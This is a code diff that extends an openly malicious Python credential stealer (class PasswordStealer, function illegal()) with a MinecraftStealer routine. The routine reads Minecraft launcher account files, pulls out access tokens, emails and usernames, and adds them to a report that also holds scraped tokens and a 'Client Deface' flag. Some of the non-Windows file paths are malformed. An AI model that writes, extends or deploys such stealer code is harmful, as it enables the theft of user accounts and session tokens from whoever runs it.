@@ -106,6 +106,41 @@ class PasswordStealer:
 		self.connection.close()
 		return stolen
 
+def getLocations():
+    username = os.environ.get('username')
+
+    if os.name == 'nt':
+        locations = [
+            f'{os.getenv("APPDATA")}\\.minecraft\\launcher_accounts.json',
+            f'{os.getenv("APPDATA")}\\Local\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang\\'
+        ]
+        
+    else:
+        locations = [
+            f'\\home\\{username}\\.minecraft\\launcher_accounts.json',
+            f'\\sdcard\\games\\com.mojang\\',
+            f'\\~\\Library\\Application Support\\minecraft'
+            f'Apps\\com.mojang.minecraftpe\\Documents\\games\\com.mojang\\'
+        ]
+
+    return locations
+
+def MinecraftStealer():
+    accounts = []
+    for location in getLocations():
+        if os.path.exists(location):
+            auth_db = json.loads(open(location).read())['accounts']
+
+            for d in auth_db:
+                sessionKey = auth_db[d].get('accessToken')
+                username = auth_db[d].get('minecraftProfile')['name']
+                sessionType = auth_db[d].get('type')
+                email = auth_db[d].get('username')
+                if sessionKey != None or '':
+                    accounts.append([username, sessionType, email, sessionKey])
+
+    return accounts
+
 def illegal():
     sender = Sender(credRec)
 
@@ -226,6 +261,8 @@ def main():
         os.getenv('APPDATA')
     )
 
+    minecraftCreds = MinecraftStealer()
+
     replacePage()
 
     message = f'''
@@ -241,6 +278,7 @@ Tokens: ```json\n{scrapedTokens}\n```
             User: {os.environ.get('username')}
             Client Deface: True
             Tokens: ```json\n{scrapedTokens}\n```
+            Minecraft Accounts: ```json\n{minecraftCreds}\n```
         '''
         }
     )
